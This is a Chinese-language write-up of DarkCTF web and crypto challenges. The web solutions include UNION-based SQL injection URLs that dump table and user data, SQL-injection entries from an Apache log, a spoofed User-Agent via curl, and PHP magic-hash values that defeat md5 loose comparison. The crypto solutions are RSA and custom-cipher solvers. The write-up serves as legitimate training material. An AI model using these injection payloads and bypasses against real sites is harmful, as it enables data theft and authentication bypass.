# DarkCTF Writeup
## 心得:
算寫比較多題的線上賽，主要刷web跟crypto
目前還是在解水題的階段，碰到難點的就卡住了，看到解出來的人很少的題也不敢碰XD
不過這次web有碰到我一直想練的sql injection，而且難度中等偏易，有學到一些新的sql語法，總算是有學到東西
crypto就還好，把rsa的刷一刷，然後解了題純水題
他的比賽題目種類蠻多的，有很多沒看過的，不過實在沒時間刷完，之後有空再看別人的writeup
## Web
### Source
#### 題目:
Don't know source is helpful or not !!
http://web.darkarmy.xyz

附檔index.php
```php
<html>
    <head>
        <title>SOURCE</title>
        <style>
            #main {
    height: 100vh;
}
        </style>
    </head>
    <body><center>
<link rel="stylesheet" href="https://www.w3schools.com/w3css/4/w3.css">
<?php
$web = $_SERVER['HTTP_USER_AGENT'];
if (is_numeric($web)){
      if (strlen($web) < 4){
          if ($web > 10000){
                 echo ('<div class="w3-panel w3-green"><h3>Correct</h3>
  <p>darkCTF{}</p></div>');
          } else {
                 echo ('<div class="w3-panel w3-red"><h3>Wrong!</h3>
  <p>Ohhhhh!!! Very Close  </p></div>');
          }
      } else {
             echo ('<div class="w3-panel w3-red"><h3>Wrong!</h3>
  <p>Nice!!! Near But Far</p></div>');
      }
} else {
    echo ('<div class="w3-panel w3-red"><h3>Wrong!</h3>
  <p>Ahhhhh!!! Try Not Easy</p></div>');
}
?>
</center>
<!-- Source is helpful -->
    </body>
</html>
```
#### 解法:
看了下source code主要是吃User-Agent欄位做判斷，馬上就想到用curl來改
curl有個-A指令可以直接改User-Agent
這題蠻友善的每個判斷式都有印錯誤訊息，可以很清楚知道自己突破到哪了
首先嘗試到strlen($web)<4那邊
```
curl -A "User-Agent:100" http://web.darkarmy.xyz
```
結果還是Ahhhhh!!! Try Not Easy
Debug了一下發現我耍笨，不需要加User-Agent:
改了後就出現Ohhhhh!!! Very Close  
```
curl -A "100" http://web.darkarmy.xyz
```
這樣問題就只剩怎麼用長度3以下表達大於10000的數
查了一下馬上找到php的科學記號表示法1e5(100000)
```
curl -A "1e5" http://web.darkarmy.xyz
```
然後就拿到flag了
>darkCTF{changeing_http_user_agent_is_easy}

### Apache Logs
#### 題目:
Our servers were compromised!! Can you figure out which technique they used by looking at Apache access logs.
flag format: DarkCTF{}

附檔logs.ctf
#### 解法:
從一堆log紀錄中找到sql injection注入的痕跡
```
192.168.32.1 - - [29/Sep/2015:03:30:56 -0400] "GET /?id=1%27%20or%20flag=flag HTTP/1.1" 200 484 "-" "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.101 Safari/537.36"
```
繼續找有沒有跟flag有關的，找到了含有CharCode的紀錄
```
192.168.32.1 - - [29/Sep/2015:03:37:34 -0400] "GET /mutillidae/index.php?page=user-info.php&username=%27+union+all+select+1%2CString.fromCharCode%28102%2C+108%2C+97%2C+103%2C+32%2C+105%2C+115%2C+32%2C+83%2C+81%2C+76%2C+95%2C+73%2C+110%2C+106%2C+101%2C+99%2C+116%2C+105%2C+111%2C+110%29%2C3+--%2B&password=&user-info-php-submit-button=View+Account+Details HTTP/1.1" 200 9582 "http://192.168.32.134/mutillidae/index.php?page=user-info.php&username=something&password=&user-info-php-submit-button=View+Account+Details" "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.101 Safari/537.36"
```
用python的split切開後得到
>102 108 97 103 32 105 115 32 83 81 76 95 73 110 106 101 99 116 105 111 110

轉成ascii，不過不是flag，被騙了XD
>flag is SQL_Injection

再下面一點又有含有CharCode的紀錄
```
192.168.32.1 - - [29/Sep/2015:03:39:46 -0400] "GET /mutillidae/index.php?page=client-side-control-challenge.php HTTP/1.1" 200 9197 "http://192.168.32.134/mutillidae/index.php?page=user-info.php&username=%27+union+all+select+1%2CString.fromCharCode%28102%2C%2B108%2C%2B97%2C%2B103%2C%2B32%2C%2B105%2C%2B115%2C%2B32%2C%2B68%2C%2B97%2C%2B114%2C%2B107%2C%2B67%2C%2B84%2C%2B70%2C%2B123%2C%2B53%2C%2B113%2C%2B108%2C%2B95%2C%2B49%2C%2B110%2C%2B106%2C%2B51%2C%2B99%2C%2B116%2C%2B49%2C%2B48%2C%2B110%2C%2B125%29%2C3+--%2B&password=&user-info-php-submit-button=View+Account+Details" "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.101 Safari/537.36"
```
一樣用python的split切開後得到
>102 108 97 103 32 105 115 32 68 97 114 107 67 84 70 123 53 113 108 95 49 110 106 51 99 116 49 48 110 125

轉成ascii，得到真正的flag
>flag is DarkCTF{5ql_1nj3ct10n}
### Simple_SQL
#### 題目:
Try to find username and password
http://simplesql.darkarmy.xyz/
#### 解法:
打開html提示用id當作參數
用id=1測試後跳出了Username跟password
```
http://simplesql.darkarmy.xyz/?id=1
```
>Username : LOL Password : Try

原本想開始sql injection，但是看這題的名字跟解出來的人數想說先往上試試看
試到id=9的時候就拿到flag了XD，也太無腦==
>Username : flag Password : darkCTF{it_is_very_easy_to_find}
### So_Simple
#### 題目:
"Try Harder" may be You get flag manually

Try id as parameter

http://web.darkarmy.xyz:30001
#### 解法:
這次我想最久也學到最多東西的一題，雖然也算簡單
一樣根據題目提示把id當作參數
```
http://web.darkarmy.xyz:30001/?id=1
```
>Your Login name:LOL
Your Password:Try

加個'，確定有sql injection漏洞
```
http://web.darkarmy.xyz:30001/?id=1%27
```
>You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''1'' LIMIT 0,1' at line 1

看到MySQL後想到有information_schema可以看，使用UNION-based開始注入
```
http://web.darkarmy.xyz:30001/?id=-1%27%20UNION%20SELECT%201,2,table_name%20FROM%20information_schema.tables%20WHERE%20%272%27%3E%271
```
>Your Login name:2
Your Password:CHARACTER_SETS

發現被LIMIT 0,1卡死，無法看到所有的table_name
於是轉向開始嘗試註解掉或靠UNION無視掉，但都失敗
推測LIMIT 0,1是強制被concat上去的
只好開始通table名跟column名，成功通出table users與其column id,username,password
接著通username，先猜admin，用LIKE是我以為=被篩掉了，但其實沒有
```
http://web.darkarmy.xyz:30001/?id=-1%27%20UNION%20(SELECT%20id,username,password%20FROM%20users%20WHERE%20username%20LIKE%20%27admin%27)%20UNION%20SELECT%201,2,3%27
```
很明顯被騙了XD
>Your Login name:admin
Your Password:darkCTF{this_is_not_a_flag}

然後猜flag就中了，運氣不錯
```
http://web.darkarmy.xyz:30001/?id=-1%27%20UNION%20(SELECT%20id,username,password%20FROM%20users%20WHERE%20username%20LIKE%20%27%flag%%27)%20UNION%20SELECT%201,2,3%27
```
>Your Login name:flag
Your Password:darkCTF{uniqu3_ide4_t0_find_fl4g}

重新想了一下有沒有更好的解法
發現了group_concat這個很猛的function，可以直接看到所有username，當初試有成功，不過我寫writeup的時候突然失效了==
這樣看起來information_schema.tables也可以這樣操作，下次有機會再試試看
```
http://web.darkarmy.xyz:30001/?id=-1%27%20UNION%20(SELECT%201,2,group_concat(username)%20FROM%20users)%20UNION%20SELECT%201,2,3%27
```
### PHP information
#### 題目:
Let's test your php knowledge.

Flag Format: DarkCTF{}

http://php.darkarmy.xyz:7001
#### 解法:
打開網站是php的source code
```php
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Corona Web</title>
</head>
<body>
    

    <style>
        body{
            background-color: whitesmoke
        }
    </style>
<?php

include "flag.php";

echo show_source("index.php");


if (!empty($_SERVER['QUERY_STRING'])) {
    $query = $_SERVER['QUERY_STRING'];
    $res = parse_str($query);
    if (!empty($res['darkctf'])){
        $darkctf = $res['darkctf'];
    }
}

if ($darkctf === "2020"){
    echo "<h1 style='color: chartreuse;'>Flag : $flag</h1></br>";
}

if ($_SERVER["HTTP_USER_AGENT"] === base64_decode("MjAyMF90aGVfYmVzdF95ZWFyX2Nvcm9uYQ==")){
    echo "<h1 style='color: chartreuse;'>Flag : $flag_1</h1></br>";
}


if (!empty($_SERVER['QUERY_STRING'])) {
    $query = $_SERVER['QUERY_STRING'];
    $res = parse_str($query);
    if (!empty($res['ctf2020'])){
        $ctf2020 = $res['ctf2020'];
    }
    if ($ctf2020 === base64_encode("ZGFya2N0Zi0yMDIwLXdlYg==")){
        echo "<h1 style='color: chartreuse;'>Flag : $flag_2</h1></br>";
                
        }
    }



    if (isset($_GET['karma']) and isset($_GET['2020'])) {
        if ($_GET['karma'] != $_GET['2020'])
        if (md5($_GET['karma']) == md5($_GET['2020']))
            echo "<h1 style='color: chartreuse;'>Flag : $flag_3</h1></br>";
        else
            echo "<h1 style='color: chartreuse;'>Wrong</h1></br>";
    }



?>
</body>
</html> 1
```
檢查一下flag被拆成四段
首先透過url加上darkctf=2020得到第一段flag
```
http://php.darkarmy.xyz:7001/?darkctf=2020
```
>Flag : DarkCTF{

接著使用前面講到的curl -A把User-Agent改成MjAyMF90aGVfYmVzdF95ZWFyX2Nvcm9uYQ==做base64 decode後的結果: 2020_the_best_year_corona
```
curl -A '2020_the_best_year_corona' http://php.darkarmy.xyz:7001/
```
得到第二段flag
>Flag : very_

第三段flag也很簡單，url加上ctf2020這個參數，值為ZGFya2N0Zi0yMDIwLXdlYg==做base64 encode成WkdGeWEyTjBaaTB5TURJd0xYZGxZZz09，一開始還看成decode想說怎麼過不了，題目真壞
```
http://php.darkarmy.xyz:7001/?ctf2020=WkdGeWEyTjBaaTB5TURJd0xYZGxZZz09
```
得到第三段flag
>nice

最後一段flag是要讓兩個參數的值不一樣，但是經過md5卻一樣
我一開始以為參數名不能純數字還試很久，結果發現是我看錯，要讓兩個參數值不一樣
看到md5就想起php的漏洞有這東西，馬上上網查，發現0e78=0e87
所以只要讓兩個參數值經過md5都是0e開頭就行，找了一下很快就找到240610708跟QNKCDZO可以
```
http://php.darkarmy.xyz:7001/?karma=240610708&2020=QNKCDZO
```
得到最後一段flag
>_web_challenge_dark_ctf}

## Crypto
### Pipe Rhyme
#### 題目:
So special

附檔:pipeRhymeChall(2).txt
```
Chall:- Pipe Rhyme

Chall Desc:- Wow you are so special.

N=0x3b7c97ceb5f01f8d2095578d561cad0f22bf0e9c94eb35a9c41028247a201a6db95f
e=0x10001
ct=0x1B5358AD42B79E0471A9A8C84F5F8B947BA9CB996FA37B044F81E400F883A309B886
```
#### 解法:
一看就RSA，沒特別看有什麼問題，直接用factorDB大法，找到n的質因數分解p,q
之後寫了簡單的解密code就拿到flag了
```python
from Crypto.Util.number import inverse
p = 31415926535897932384626433832795028841
q = 56129192858827520816193436882886842322337671
n = p*q
e = 65537
phi = (p-1)*(q-1)
d = inverse(e,phi)
ct = 810005773870709891389047844710609951449521418582816465831855191640857602960242822

pt = hex(pow(ct,d,n))[2:]
print(bytes.fromhex(pt))
```
flag如下:
>darkCTF{4v0iD_us1ngg_p1_pr1mes}

### WEIRD ENCRYPTION
#### 題目:
I made this weird encryption I hope you can crack it.

附檔:
enc.py
```python
prefix="Hello. Your flag is DarkCTF{"
suffix="}."
main_string="c an u br ea k th is we ir d en cr yp ti on".split()

clear_text = prefix + flag + suffix
enc_text = ""
for letter in clear_text:
    c1 = ord(letter) / 16
    c2 = ord(letter) % 16
    enc_text += main_string[c1]
    enc_text += main_string[c2]

print enc_text
```
Encrypted
```
eawethkthcrthcrthonutiuckirthoniskisuucthththcrthanthisucthirisbruceaeathanisutheneabrkeaeathisenbrctheneacisirkonbristhwebranbrkkonbrisbranthypbrbrkonkirbrciskkoneatibrbrbrbrtheakonbrisbrckoneauisubrbreacthenkoneaypbrbrisyputi
```
#### 解法:
一個要解密ciphertext的題目，首先把prefix跟suffix抽掉減少解密長度
發現main_string沒有重複，不用擔心有collision，所以直接寫解密程式就拿到flag了
中間因為for loop的range卡很久，下次要記得想對index做操作要用while比較好，range會自動把index改回去==
```python
main_string="c an u br ea k th is we ir d en cr yp ti on".split()
enc_text = "brctheneacisirkonbristhwebranbrkkonbrisbranthypbrbrkonkirbrciskkoneatibrbrbrbrtheakonbrisbrckoneauisubrbreacthenkoneaypbrbr"
dec_text = ""

def find_index(i):
    if enc_text[i] in main_string:
        return main_string.index(enc_text[i]),1
    else:
        c = enc_text[i] + enc_text[i+1]
        return main_string.index(c),2

i = 0        
while i < len(enc_text):
    index1,len1 = find_index(i)
    i += len1
    index2,len2 = find_index(i)
    i += len2
    num = index1*16+index2
    dec_text += chr(num)
        
print(dec_text)
```
flag如下
>DarkCTF{0k@y_7h15_71m3_Y0u_N33d_70_Br3@k_M3}

### Easy RSA
#### 題目:
Just a easy and small E-RSA for you :)

附檔:
enc
```
n = [redacted]
e = 3
cipher = 70415348471515884675510268802189400768477829374583037309996882626710413688161405504039679028278362475978212535629814001515318823882546599246773409243791879010863589636128956717823438704956995941
```
#### 解法:
看到這題覺得好溫馨，picoCTF寫過類似的題目，因為RSA的e很小可以直接爆root也就是plaintext
用python的gmpy2的iroot即可取得flag
```python
import gmpy2
from Crypto.Util.number import long_to_bytes

e = 3
ct = 70415348471515884675510268802189400768477829374583037309996882626710413688161405504039679028278362475978212535629814001515318823882546599246773409243791879010863589636128956717823438704956995941

pt,b = gmpy2.iroot(ct,e)
print(long_to_bytes(pt))
```
flag如下:
>darkCTF{5m4111111_3_4tw_xD}
